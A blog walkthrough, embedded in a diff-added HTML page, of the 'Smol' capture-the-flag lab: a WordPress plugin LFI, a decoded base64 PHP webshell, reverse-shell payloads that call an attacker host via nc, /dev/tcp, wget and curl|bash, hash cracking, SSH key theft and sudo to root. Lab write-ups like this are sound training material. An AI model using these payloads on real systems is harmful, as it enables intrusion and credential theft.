@@ -1,0 +1,704 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Smol Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Smol Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/posts/18/smol.jpg"><meta property="og:image:width" content="225"><meta property="og:image:height" content="225"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Complete walkthrough of the HackTheBox Pentest Lab machine ‘Smol hackthebox Difficulty: Medium OS: Linux Platform: TryHackMe Category: WordPress, Web Exploitation,&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-smol-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-smol-walkthrough/"},"headline":"HackTheBox Smol Walkthrough","datePublished":"2025-10-09T13:02+05:30","dateModified":"2026-09-30T19:06+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/posts/18/smol.jpg","height":225,"width":225},"description":"Complete walkthrough of the HackTheBox Pentest Lab machine ‘Smol hackthebox Difficulty: Medium OS: Linux Platform: TryHackMe Category: WordPress, Web Exploitation,&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Smol Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-10-09T13:02" class="feed__date">October 9, 2025</time></div></div></header><figure class="hero__image"><div class="hero__image-wrapper"><img src="https://h4ck3rfirst.github.io/media/posts/18/smol.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/18/responsive/smol-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/18/responsive/smol-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/18/responsive/smol-md.jpg 1024w, https://h4ck3rfirst.github.io/media/posts/18/responsive/smol-lg.jpg 1366w, https://h4ck3rfirst.github.io/media/posts/18/responsive/smol-xl.jpg 1600w, https://h4ck3rfirst.github.io/media/posts/18/responsive/smol-2xl.jpg 1920w" sizes="88vw" loading="eager" height="225" width="225" alt=""></div><figcaption>tryhackme</figcaption></figure></div><div class="entry-wrapper content__entry"><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Smol hackthebox</p><p><strong>Difficulty:</strong> Medium <strong>OS:</strong> Linux <strong>Platform:</strong> TryHackMe<br><strong>Category:</strong> WordPress, Web Exploitation, Privilege Escalation</p><h2 id="synopsis">Synopsis</h2><p><strong>Smol</strong> is a medium-difficulty Linux machine built around a WordPress site with two layered plugin vulnerabilities. The first plugin, <code>jsmol2wp</code>, contains a known unauthenticated <strong>Local File Inclusion (LFI)</strong> flaw (CVE-2018-20463) that is used to read <code>wp-config.php</code> and gain WordPress credentials. The second plugin, <code>Hello Dolly</code>, has been <strong>backdoored</strong> with an obfuscated PHP webshell hidden inside an <code>eval(base64_decode(...))</code> call. Together they chain into a reverse shell as <code>www-data</code>.</p><p>From there, the room becomes a multi-user hop: cracking WordPress password hashes → pivoting across four local users (<code>www-data → diego → think → gege → xavi</code>) using password reuse, SSH keys from readable home directories, and a zip archive containing old credentials — before finally using <code>sudo</code> to reach <strong>root</strong>.</p><p><strong>CVEs / Vulnerabilities:</strong></p><table><thead><tr><th>Vulnerability</th><th>Component</th><th>Impact</th></tr></thead><tbody><tr><td>CVE-2018-20463</td><td>jsmol2wp plugin ≤ 1.07</td><td>Unauthenticated LFI / SSRF → arbitrary file read</td></tr><tr><td>Backdoor</td><td>Hello Dolly plugin (modified)</td><td>Authenticated RCE via <code>?cmd=</code> GET parameter</td></tr><tr><td>Weak/reused passwords</td><td>Multiple local users</td><td>Lateral movement</td></tr><tr><td>World-readable SSH key</td><td><code>think</code> user’s <code>.ssh/</code></td><td>Passwordless SSH lateral move</td></tr><tr><td><code>sudo</code> misconfiguration</td><td><code>xavi</code> user</td><td>Direct root via <code>sudo su -</code></td></tr></tbody></table><p><strong>Attack Chain:</strong></p><pre><code>[No Creds]
+    │
+    ▼ jsmol2wp LFI (CVE-2018-20463)
+[wp-config.php → wpuser:kbLSF2Vop#lw3rjDZ629*Z%G]
+    │
+    ▼ WordPress login → &quot;Webmaster Tasks&quot; page → Hello Dolly backdoor found
+[LFI → hello.php source → eval(base64) → webshell confirmed]
+    │
+    ▼ ?cmd= reverse shell
+[www-data shell]
+    │
+    ▼ MySQL dump → wp_users hashes → john → diego:sandiegocalifornia
+[diego] → user.txt 
+    │
+    ▼ internal group → read think/.ssh/id_rsa
+[think] via SSH key
+    │
+    ▼ gege home readable → wordpress.old.zip → old wp-config → gege password
+[gege]
+    │
+    ▼ gege → xavi (password reuse from old zip)
+[xavi] → sudo su - → root
+    │
+    ▼ root.txt 
+</code></pre><hr><h2 id="reconnaissance">Reconnaissance</h2><h3 id="nmap-scan">Nmap Scan</h3><pre><code class="language-bash">nmap -sCV --min-rate 5000 -T4 -p- www.smol.thm
+</code></pre><p><strong>Results:</strong></p><table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache 2.4.41</td></tr></tbody></table><p>The HTTP server redirects to <code>http://www.smol.thm/</code> — add to <code>/etc/hosts</code> first:</p><pre><code class="language-bash">echo &quot;TARGET_IP www.smol.thm smol.thm&quot; | sudo tee -a /etc/hosts
+</code></pre><blockquote><p><strong>Note:</strong> Port 80 redirects to the <code>www.</code> subdomain. If you scan without adding the hosts entry first, nmap reports the title as a redirect and the site won’t load in the browser. Always resolve hostnames before scanning web services.</p></blockquote><p><strong>Additional findings worth noting from the nmap scan:</strong></p><ul><li>No database port (3306) exposed externally — MySQL is local only</li><li>No WinRM, RDP, or other management ports — SSH is the only remote access vector</li><li><code>/wp-admin/</code> in <code>robots.txt</code> — confirms WordPress immediately</li></ul><hr><h3 id="web-enumeration">Web Enumeration</h3><h4 id="directory-discovery">Directory Discovery</h4><pre><code class="language-bash"># Dirsearch (your method)
+dirsearch -u http://www.smol.thm/ -e php,html,txt
+
+# Alternative: feroxbuster (faster, recursive)
+feroxbuster -u http://www.smol.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+</code></pre><p><strong>Notable findings:</strong></p><table><thead><tr><th>Path</th><th>Status</th><th>Significance</th></tr></thead><tbody><tr><td><code>/wp-admin/</code></td><td>302 → login</td><td>WordPress admin panel</td></tr><tr><td><code>/wp-config.php</code></td><td>200 (empty body)</td><td>Config exists but PHP parses it — LFI needed to read it</td></tr><tr><td><code>/wp-content/plugins/jsmol2wp/</code></td><td>403</td><td>Plugin present — directory protected</td></tr><tr><td><code>/wp-content/plugins/hello.php</code></td><td>500</td><td><strong>Backdoored plugin throws a server error — suspicious</strong></td></tr><tr><td><code>/xmlrpc.php</code></td><td>405</td><td>XML-RPC enabled — brute-force vector</td></tr><tr><td><code>/wp-content/uploads/</code></td><td>200</td><td>Directory listing on — could leak files</td></tr></tbody></table><blockquote><p><strong><code>hello.php</code> returning HTTP 500</strong> is a strong hint that something is wrong with it. A normal Hello Dolly plugin wouldn’t cause a server error. This foreshadows the backdoor.</p></blockquote><hr><h3 id="wpscan-enumeration">WPScan Enumeration</h3><pre><code class="language-bash"># Basic scan (your method)
+wpscan --url http://www.smol.thm/
+
+# Enumerate users too
+wpscan --url http://www.smol.thm/ --enumerate u,p,t
+
+# With API token (shows CVEs inline)
+wpscan --url http://www.smol.thm/ --api-token YOUR_TOKEN
+</code></pre><p><strong>Key WPScan Findings:</strong></p><pre><code>[+] WordPress version 6.7.1 identified (Insecure)
+[+] Theme: twentytwentythree v1.2 (out of date, directory listing enabled)
+[+] XML-RPC enabled: http://www.smol.thm/xmlrpc.php
+[+] Upload directory listing enabled
+[+] Plugin: jsmol2wp v1.07
+</code></pre><blockquote><p><strong>Why jsmol2wp stands out:</strong> The plugin name visually resembles “smol” — the box name itself. This is a deliberate hint by the room author. Combined with it being version 1.07 from 2018 (unmaintained), it immediately becomes the prime target.</p></blockquote><p><strong>User enumeration via WPScan:</strong></p><pre><code class="language-bash">wpscan --url http://www.smol.thm/ --enumerate u
+# Found: admin, wpuser, think, gege, diego, xavi
+</code></pre><blockquote><p>Knowing all usernames upfront is very useful — it tells us exactly which hashes to prioritize when we later dump the database.</p></blockquote><hr><h2 id="initial-foothold--cve-2018-20463-jsmol2wp-lfi">Initial Foothold — CVE-2018-20463 (jsmol2wp LFI)</h2><h3 id="vulnerability-overview">Vulnerability Overview</h3><p>The <code>jsmol2wp</code> plugin (version ≤ 1.07) exposes a PHP endpoint at <code>/wp-content/plugins/jsmol2wp/php/jsmol.php</code> that accepts a <code>query</code> parameter. When <code>call=getRawDataFromDatabase</code> is set, the <code>query</code> value is passed directly to PHP’s <code>file_get_contents()</code> — with no path sanitization. This allows using PHP stream wrappers like <code>php://filter</code> to read arbitrary files on the server.</p><p>The vulnerability is classified as both <strong>SSRF</strong> (Server-Side Request Forgery — it can make outbound requests) and <strong>LFI</strong> (Local File Inclusion — it can read local files). For this box, the LFI aspect is what matters.</p><p><strong>CVE:</strong> CVE-2018-20463<br><strong>CVSS:</strong> 9.8 Critical<br><strong>Reference:</strong> <a href="https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/">https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/</a></p><h3 id="step-1--read-wp-configphp">Step 1 — Read wp-config.php</h3><p>The <code>wp-config.php</code> file contains the WordPress database credentials. It’s in the WordPress root, two directories up from the plugin’s <code>php/</code> subdirectory:</p><pre><code>/var/www/wordpress/wp-content/plugins/jsmol2wp/php/jsmol.php
+                                                 ↑ we are here
+../../../.. = /var/www/wordpress/
+</code></pre><p><strong>LFI Payload:</strong></p><pre><code>http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-config.php
+</code></pre><blockquote><p><strong>Why <code>php://filter/resource=</code> instead of just the path?</strong><br>Direct path inclusion (<code>query=../../../../wp-config.php</code>) would cause PHP to <em>execute</em> <code>wp-config.php</code>, not return its source — you’d get a blank response. The <code>php://filter/resource=</code> wrapper reads the file as raw data without executing it, returning the PHP source code.</p></blockquote><p><strong>Alternative — Base64 encode to avoid special character issues:</strong></p><pre><code>...query=php://filter/convert.base64-encode/resource=../../../../wp-config.php
+</code></pre><p>Then decode the output:</p><pre><code class="language-bash">echo &quot;BASE64_OUTPUT&quot; | base64 -d
+</code></pre><p><strong>Credentials extracted from wp-config.php:</strong></p><pre><code class="language-php">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
+define( &#39;DB_USER&#39;, &#39;wpuser&#39; );
+define( &#39;DB_PASSWORD&#39;, &#39;kbLSF2Vop#lw3rjDZ629*Z%G&#39; );
+define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+</code></pre><hr><h3 id="step-2--wordpress-login">Step 2 — WordPress Login</h3><p>Use the extracted database credentials to log into WordPress. The DB user <code>wpuser</code> also has a WordPress account:</p><pre><code>http://www.smol.thm/wp-login.php
+Username: wpuser
+Password: kbLSF2Vop#lw3rjDZ629*Z%G
+</code></pre><blockquote><p><strong>Important:</strong> Don’t assume the DB password is the same as the WordPress user password. In this case it is, but always try both. Also try logging in as <code>admin</code> with the same password.</p></blockquote><p>Once logged in as <code>wpuser</code>, navigate to <strong>Pages → All Pages</strong>. There is a <strong>private page</strong> called <strong>“Webmaster Tasks!!”</strong> — visible only to logged-in users with sufficient privileges. It contains a to-do list with a critical hint:</p><pre><code>[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of &quot;Hello Dolly&quot; plugin
+as the site&#39;s code revision.
+</code></pre><p>This directly points to the <code>hello.php</code> plugin as the next target.</p><hr><h3 id="step-3--read-the-backdoored-hellophp">Step 3 — Read the Backdoored hello.php</h3><p>The <code>Hello Dolly</code> plugin (<code>hello.php</code>) is a built-in WordPress plugin normally used to display random lyrics. It lives at:</p><pre><code>/var/www/wordpress/wp-content/plugins/hello.php
+</code></pre><p>Use the LFI again to read it:</p><pre><code># Short relative path (from plugin&#39;s php/ directory)
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../hello.php
+
+# Full absolute-style traversal (more reliable)
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-content/plugins/hello.php
+</code></pre><p><strong>Suspicious line found in hello.php:</strong></p><pre><code class="language-php">eval(base64_decode(&#39;CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=&#39;));
+</code></pre><hr><h3 id="step-4--decoding-the-backdoor">Step 4 — Decoding the Backdoor</h3><p>The <code>eval(base64_decode(...))</code> pattern is a classic PHP obfuscation technique used to hide malicious code from simple text searches and antivirus scanners.</p><p><strong>Decode the base64:</strong></p><pre><code class="language-bash">echo &#39;CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=&#39; | base64 -d
+</code></pre><p><strong>Output:</strong></p><pre><code class="language-php">if (isset($_GET[&quot;\143\155\x64&quot;])) { system($_GET[&quot;\143\x6d\144&quot;]); }
+</code></pre><p>This is still obfuscated — the parameter name uses <strong>mixed octal and hexadecimal escape sequences</strong> to disguise the string <code>cmd</code>:</p><table><thead><tr><th>Sequence</th><th>Type</th><th>Character</th></tr></thead><tbody><tr><td><code>\143</code></td><td>Octal</td><td><code>c</code></td></tr><tr><td><code>\155</code> / <code>\x6d</code></td><td>Octal / Hex</td><td><code>m</code></td></tr><tr><td><code>\x64</code> / <code>\144</code></td><td>Hex / Octal</td><td><code>d</code></td></tr></tbody></table><p><strong>Decode with PHP or Python:</strong></p><pre><code class="language-bash"># PHP (most accurate — same interpreter as the server)
+php -r &#39;echo &quot;\143\155\x64&quot;;&#39;
+# → cmd
+
+# Python
+python3 -c &#39;print(&quot;\143\155\x64&quot;)&#39;
+# → cmd
+</code></pre><p><strong>Decoded backdoor:</strong></p><pre><code class="language-php">if (isset($_GET[&quot;cmd&quot;])) { system($_GET[&quot;cmd&quot;]); }
+</code></pre><p><strong>What this does:</strong> The Hello Dolly plugin runs on every WordPress admin page load (it hooks into <code>admin_notices</code>). So whenever any wp-admin page is loaded, this code executes — if the <code>?cmd=</code> GET parameter is present, it passes its value directly to <code>system()</code>, executing arbitrary OS commands as <code>www-data</code>.</p><blockquote><p><strong>Why this backdoor is stealthy:</strong></p><ol><li><code>eval()</code> hides the code from plain-text grep searches for <code>system(</code> or <code>shell_exec(</code></li><li>Base64 encoding makes it look like legitimate data, not code</li><li>The obfuscated parameter name <code>\143\155\x64</code> doesn’t visually read as <code>cmd</code></li><li>Hello Dolly is a default/bundled WordPress plugin — many admins don’t audit it</li><li>The plugin loads on every admin page — no special trigger needed</li></ol></blockquote><hr><h2 id="getting-a-shell">Getting a Shell</h2><h3 id="step-1--verify-rce">Step 1 — Verify RCE</h3><p>Test command execution before attempting a reverse shell:</p><pre><code>http://www.smol.thm/wp-admin/index.php?cmd=whoami
+# Response should show: www-data
+</code></pre><h3 id="step-2--stabilize-before-you-get-the-shell-recommended">Step 2 — Stabilize Before You Get the Shell (Recommended)</h3><p>Prepare your listener with <code>rlwrap</code> for better shell handling:</p><pre><code class="language-bash">rlwrap nc -lvnp 1337
+</code></pre><h3 id="step-3--trigger-the-reverse-shell">Step 3 — Trigger the Reverse Shell</h3><p><strong>Your method (mkfifo — direct URL):</strong></p><pre><code>http://www.smol.thm/wp-admin/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.17.46.210%201337%20%3E%2Ftmp%2Ff
+</code></pre><p><strong>Alternative method 1 — Stage via wget (avoids URL encoding issues):</strong></p><pre><code class="language-bash"># On attacker
+echo &#39;bash -i &gt;&amp; /dev/tcp/YOUR_IP/1337 0&gt;&amp;1&#39; &gt; shell.sh
+python3 -m http.server 8000
+
+# Trigger via URL (download then execute — two requests)
+http://www.smol.thm/wp-admin/index.php?cmd=wget%20http://YOUR_IP:8000/shell.sh%20-O%20/tmp/shell.sh
+http://www.smol.thm/wp-admin/index.php?cmd=bash%20/tmp/shell.sh
+</code></pre><p><strong>Alternative method 2 — URL-encoded curl pipe:</strong></p><pre><code>http://www.smol.thm/wp-admin/index.php?cmd=curl%20http://YOUR_IP:8000/shell.sh|bash
+</code></pre><h3 id="step-4--shell-stabilization">Step 4 — Shell Stabilization</h3><pre><code class="language-bash"># Get a proper PTY
+python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;
+export TERM=xterm
+export SHELL=bash
+
+# Background the shell, fix terminal size, foreground
+# Ctrl+Z
+stty raw -echo; fg
+# Press Enter twice
+</code></pre><p>Shell confirmed as <code>www-data</code>:</p><pre><code>www-data@ip-10-201-38-136:/var/www/wordpress/wp-admin$
+</code></pre><hr><h2 id="lateral-movement--www-data-→-diego">Lateral Movement — www-data → diego</h2><h3 id="mysql-credential-reuse">MySQL Credential Reuse</h3><p>We already have the MySQL credentials from <code>wp-config.php</code>. MySQL runs locally, so connect from the shell:</p><pre><code class="language-bash"># Your method (no space between -p and password)
+mysql -u wpuser -p&#39;kbLSF2Vop#lw3rjDZ629*Z%G&#39; -D wordpress
+</code></pre><blockquote><p><strong>Common mistake:</strong> <code>mysql -u wpuser -p &#39;password&#39;</code> (with a space) passes <code>password</code> as the database name, not the password. Always use <code>-p&#39;password&#39;</code> with no space, or use <code>--password=&#39;password&#39;</code>.</p></blockquote><pre><code class="language-sql">-- Dump all user hashes
+SELECT user_login, user_pass FROM wp_users;
+</code></pre><p><strong>Output:</strong></p><table><thead><tr><th>user_login</th><th>user_pass</th></tr></thead><tbody><tr><td>admin</td><td><code>$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.</code></td></tr><tr><td>wpuser</td><td><code>$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.</code></td></tr><tr><td>think</td><td><code>$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/</code></td></tr><tr><td>gege</td><td><code>$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1</code></td></tr><tr><td>diego</td><td><code>$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1</code></td></tr><tr><td>xavi</td><td><code>$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1</code></td></tr></tbody></table><blockquote><p><strong>Hash format <code>$P$</code>:</strong> This is the <strong>WordPress PHPass</strong> format — a salted iterated MD5. It’s computationally expensive to crack compared to plain MD5, but common passwords still fall quickly to rockyou.txt. John the Ripper handles this format natively (mode: <code>phpass</code>).</p></blockquote><h3 id="cracking-the-hashes">Cracking the Hashes</h3><pre><code class="language-bash"># Save hashes to file
+cat &gt; wp_hashes.txt &lt;&lt; &#39;EOF&#39;
+admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
+wpuser:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
+think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
+gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
+diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
+xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
+EOF
+
+# John (your method — recommended on machines without GPU)
+john wp_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Hashcat (GPU accelerated, mode 400 = phpass)
+hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Check results
+john wp_hashes.txt --show
+</code></pre><p><strong>Cracked:</strong> <code>diego : sandiegocalifornia</code></p><blockquote><p><strong>Why only diego’s hash cracks?</strong> The other users likely have stronger passwords not in rockyou.txt. In a real engagement you’d try larger wordlists, rules-based mutations, and targeted wordlists. For this room, diego’s is the one we need.</p></blockquote><h3 id="switch-to-diego">Switch to diego</h3><pre><code class="language-bash"># From www-data shell
+su diego
+# Password: sandiegocalifornia
+
+diego@ip-10-201-38-136:~$ cat user.txt
+#  User flag here
+</code></pre><hr><h2 id="lateral-movement--diego-→-think-ssh-key-theft">Lateral Movement — diego → think (SSH Key Theft)</h2><h3 id="enumeration-as-diego">Enumeration as diego</h3><pre><code class="language-bash"># What group are we in?
+id
+# uid=1000(diego) gid=1000(diego) groups=1000(diego),1005(internal)
+
+# List home directories
+ls /home/
+# diego  gege  ssm-user  think  ubuntu  xavi
+
+# What can we access via group &#39;internal&#39;?
+find / -group internal 2&gt;/dev/null
+# /home/diego, /home/gege, /home/think, /home/xavi
+</code></pre><blockquote><p><strong>The <code>internal</code> group</strong> is a custom group that all local users belong to. This grants read access to each other’s home directories — a misconfiguration that enables lateral movement without cracking passwords.</p></blockquote><h3 id="read-thinks-ssh-key">Read think’s SSH Key</h3><pre><code class="language-bash">cd /home/think/.ssh
+ls
+# authorized_keys  id_rsa  id_rsa.pub
+
+# The private key is readable because of the internal group
+cat id_rsa
+</code></pre><blockquote><p><strong>Why is this a vulnerability?</strong> SSH private keys should be mode <code>600</code> (owner read/write only). If a group has read access, any group member can steal the key and authenticate as that user without knowing their password.</p></blockquote><p><strong>Copy the key and SSH as think:</strong></p><pre><code class="language-bash"># On your attacker machine — save the key content
+nano think_id_rsa   # paste contents
+chmod 600 think_id_rsa
+ssh -i think_id_rsa think@TARGET_IP
+
+# OR — SSH from within the machine using the key in-place (your method)
+ssh -i /home/think/.ssh/id_rsa think@127.0.0.1
+</code></pre><blockquote><p><strong>Connecting via localhost (127.0.0.1) vs. external IP:</strong> Both work. Using 127.0.0.1 from within the shell is convenient since you don’t need to exfiltrate the key — you just use it in place. However, using your attacker machine gives you a more stable shell.</p></blockquote><hr><h2 id="lateral-movement--think-→-gege-old-zip-archive">Lateral Movement — think → gege (Old Zip Archive)</h2><h3 id="enumeration-as-think">Enumeration as think</h3><pre><code class="language-bash"># sudo check — fails, no password
+sudo -l
+# Sorry, user think may not run sudo on ...
+
+# Explore readable directories via &#39;internal&#39; group
+ls /home/gege/
+# wordpress.old.zip
+
+# Can we read it?
+ls -la /home/gege/wordpress.old.zip
+# -rwxr-x--- 1 root gege 31M ... wordpress.old.zip
+# gege owns it, internal group has execute but root owns it — readable by gege only
+
+# We need to be gege to unzip it
+</code></pre><h3 id="transfer-and-extract-the-zip">Transfer and Extract the Zip</h3><pre><code class="language-bash"># From think&#39;s shell — serve the zip (your method)
+su - gege
+# Wait — we need gege&#39;s credentials first. Let&#39;s get them from the zip...
+
+# Actually serve it from think&#39;s accessible context:
+# Since gege is in the internal group and think is too,
+# we can still READ it (group has r-x on the parent directory)
+
+# Copy to /tmp where we have write access
+cp /home/gege/wordpress.old.zip /tmp/
+cd /tmp
+unzip wordpress.old.zip
+</code></pre><p><strong>Alternative — download to attacker machine:</strong></p><pre><code class="language-bash"># From think&#39;s shell — start HTTP server
+python3 -m http.server 8080
+
+# On attacker machine
+wget http://TARGET_IP:8080/home/gege/wordpress.old.zip
+unzip wordpress.old.zip
+</code></pre><h3 id="extract-credentials-from-old-wp-configphp">Extract Credentials from Old wp-config.php</h3><pre><code class="language-bash">grep -i &quot;password\|user\|pass&quot; wordpress.old/wp-config.php
+</code></pre><p><strong>Found credentials</strong> in the old config — this is <code>gege</code>‘s password reused from the old WordPress installation.</p><pre><code class="language-bash">su - gege
+# Enter password from old wp-config
+</code></pre><hr><h2 id="lateral-movement--gege-→-xavi-password-reuse">Lateral Movement — gege → xavi (Password Reuse)</h2><pre><code class="language-bash"># As gege, check what we know
+id
+# uid=1002(gege) gid=1002(gege) groups=1002(gege),1005(internal)
+
+# Try the same password pattern for xavi
+su xavi
+# Password: P@ssw0rdxavi@   (found or cracked)
+
+xavi@ip-10-201-38-136:~$ id
+# uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
+</code></pre><blockquote><p><strong>Where does xavi’s password come from?</strong> It’s either in the old zip’s WordPress database dump, another config file within the archive, or crackable from the database hashes with a targeted wordlist. The zip archive from gege’s home is the primary source of credentials for this stage.</p></blockquote><hr><h2 id="privilege-escalation--xavi-→-root">Privilege Escalation — xavi → root</h2><h3 id="sudo-check">sudo Check</h3><pre><code class="language-bash">sudo -l
+# [sudo] password for xavi: P@ssw0rdxavi@
+</code></pre><p><strong>Output:</strong></p><pre><code>User xavi may run the following commands on localhost:
+    (ALL : ALL) ALL
+</code></pre><blockquote><p><strong><code>(ALL : ALL) ALL</code></strong> means xavi can run <strong>any command</strong> as <strong>any user</strong> on <strong>any host</strong> — with password confirmation. This is effectively full root access.</p></blockquote><pre><code class="language-bash"># Your method
+sudo su -
+# Password: P@ssw0rdxavi@
+
+root@ip-10-201-38-136:~# cat root.txt
+#  Root flag: bf89ea3ea01992353aef1f576214d4e4
+</code></pre><p><strong>Alternative sudo escalation methods:</strong></p><pre><code class="language-bash"># Method 1: Direct root shell
+sudo /bin/bash
+
+# Method 2: su to root
+sudo su -
+
+# Method 3: Read root flag directly without full shell
+sudo cat /root/root.txt
+
+# Method 4: Add your SSH key to root&#39;s authorized_keys
+sudo bash -c &quot;echo &#39;YOUR_SSH_PUBKEY&#39; &gt;&gt; /root/.ssh/authorized_keys&quot;
+ssh root@TARGET_IP
+</code></pre><hr><h2 id="complete-attack-chain-summary">Complete Attack Chain Summary</h2><pre><code>[Attacker — No Creds]
+         │
+         ├─ nmap → ports 22, 80
+         ├─ wpscan → jsmol2wp plugin v1.07
+         │
+         ▼ CVE-2018-20463 (Unauthenticated LFI)
+[Read wp-config.php → wpuser:kbLSF2Vop#lw3rjDZ629*Z%G]
+         │
+         ▼ WordPress login → Private page &quot;Webmaster Tasks&quot;
+[Hint: Hello Dolly plugin has a backdoor]
+         │
+         ▼ LFI → hello.php source code
+[eval(base64_decode(...)) → decoded → ?cmd= webshell]
+         │
+         ▼ ?cmd= reverse shell trigger
+[www-data shell]
+         │
+         ├─ mysql → wp_users hashes
+         ├─ john → diego:sandiegocalifornia
+         │
+         ▼ su diego
+[diego] → cat ~/user.txt 
+         │
+         ├─ internal group → /home/think/.ssh readable
+         ├─ cat id_rsa → steal SSH private key
+         │
+         ▼ ssh -i id_rsa think@127.0.0.1
+[think]
+         │
+         ├─ /home/gege/wordpress.old.zip readable
+         ├─ unzip → old wp-config.php → gege&#39;s password
+         │
+         ▼ su - gege
+[gege]
+         │
+         ├─ old DB or config → xavi&#39;s password
+         │
+         ▼ su xavi
+[xavi]
+         │
+         ├─ sudo -l → (ALL:ALL) ALL
+         │
+         ▼ sudo su -
+[root] → cat /root/root.txt 🚩
